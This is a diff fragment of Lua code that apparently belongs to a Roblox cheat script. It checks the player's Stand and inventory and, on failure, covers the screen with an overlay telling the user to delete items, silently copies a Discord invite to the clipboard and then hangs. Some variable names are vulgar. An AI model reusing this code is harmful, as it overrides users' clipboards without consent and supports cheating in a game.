+			local GUI = Instance.new("ScreenGui")
+			local Main = Instance.new("Frame", GUI)
+			local title = Instance.new("TextLabel", Main)
+			local message = Instance.new("TextLabel", Main)
+			local pula = Instance.new("TextLabel", Main)
+			local niager = Instance.new("TextLabel", Main)
+			GUI.Name = "HsB Wm"
+			GUI.Enabled = true
+			GUI.Parent = game.CoreGui
+			title.Name = ("Buci")
+			message.Name = ("Bucu")
+			pula.Name = ("Nuvreau")
+			niager.Name = ("Bine")
+			Main.Name = "MainFrame"
+			Main.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+			Main.BorderSizePixel = 0
+			Main.Position = UDim2.new(0, 0, 0, -40)
+			Main.Size = UDim2.new(1, 0, 0, 1100)
+			Main.BackgroundTransparency = 0
+
+			title.BackgroundTransparency = 1
+			title.Font = Enum.Font.SourceSansBold
+			title.Position = UDim2.new(0, -5, 1, -1100)
+			title.Size = UDim2.new(1, 0, 0, 50)
+			title.Text = "You don't have Whitensake or Dio's Diary or not enough level or delete green baby from your inventory"
+			title.TextColor3 = Color3.new(455, 455, 455)
+			title.TextSize = 17
+			title.TextScaled = true
+			title.TextTransparency = 0
+
+			message.BackgroundTransparency = 1
+			message.Font = Enum.Font.SourceSansBold
+			message.Position = UDim2.new(0, -30, 1, -900)
+			message.Size = UDim2.new(1, 0, 0, 60)
+			message.Text = "Script did not execute!"
+			message.TextColor3 = Color3.new(455, 455, 455)
+			message.TextSize = 17
+			message.TextScaled = true
+			message.TextWrapped = true
+			message.TextTransparency = 0
+			message.Text = "Copied Invite To Clipboard"
+
+			pula.BackgroundTransparency = 1
+			pula.Font = Enum.Font.SourceSansBold
+			pula.Position = UDim2.new(0, -30, 1, -500)
+			pula.Size = UDim2.new(1, 0, 0, 70)
+			pula.Text = "discord.gg/HTCZPzTrzc"
+			pula.TextColor3 = Color3.new(455, 455, 455)
+			pula.TextSize = 20
+			pula.TextScaled = true
+			pula.TextWrapped = true
+			pula.TextTransparency = 0
+			setclipboard(pula.Text)
+			wait(9e9)
+		end
+	elseif LocalPlayer.PlayerStats.Stand.Value == "Whitesnake" and LocalPlayer.Backpack:FindFirstChild("Jotaro's Disc") then
+		print("whatudoin")
+		local GUI = Instance.new("ScreenGui")
+		local Main = Instance.new("Frame", GUI)
+		local title = Instance.new("TextLabel", Main)
+		local message = Instance.new("TextLabel", Main)
+		local pula = Instance.new("TextLabel", Main)
+		local niager = Instance.new("TextLabel", Main)
+		GUI.Name = "HsB Wm"
+		GUI.Enabled = true
+		GUI.Parent = game.CoreGui
+		title.Name = ("Buci")
+		message.Name = ("Bucu")
+		pula.Name = ("Nuvreau")
+		niager.Name = ("Bine")
+		Main.Name = "MainFrame"
+		Main.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+		Main.BorderSizePixel = 0
+		Main.Position = UDim2.new(0, 0, 0, -40)
+		Main.Size = UDim2.new(1, 0, 0, 1100)
+		Main.BackgroundTransparency = 0
+
+		title.BackgroundTransparency = 1
+		title.Font = Enum.Font.SourceSansBold
+		title.Position = UDim2.new(0, -5, 1, -1100)
+		title.Size = UDim2.new(1, 0, 0, 50)
+		title.Text = "Please delete any Jotaro Disc or Dio's Bone before using the script"
+		title.TextColor3 = Color3.new(455, 455, 455)
+		title.TextSize = 17
+		title.TextScaled = true
+		title.TextTransparency = 0
+
+		message.BackgroundTransparency = 1
+		message.Font = Enum.Font.SourceSansBold
+		message.Position = UDim2.new(0, -30, 1, -900)
+		message.Size = UDim2.new(1, 0, 0, 60)
+		message.Text = "Script did not execute!"
+		message.TextColor3 = Color3.new(455, 455, 455)
+		message.TextSize = 17
+		message.TextScaled = true
+		message.TextWrapped = true
+		message.TextTransparency = 0
+		message.Text = "Copied Invite To Clipboard"
+
+		pula.BackgroundTransparency = 1
+		pula.Font = Enum.Font.SourceSansBold
+		pula.Position = UDim2.new(0, -30, 1, -500)
+		pula.Size = UDim2.new(1, 0, 0, 70)
+		pula.Text = "discord.gg/HTCZPzTrzc"
+		pula.TextColor3 = Color3.new(455, 455, 455)
+		pula.TextSize = 20
+		pula.TextScaled = true
+		pula.TextWrapped = true
+		pula.TextTransparency = 0
+		setclipboard(pula.Text)
+		wait(9e9)
+	end
+end
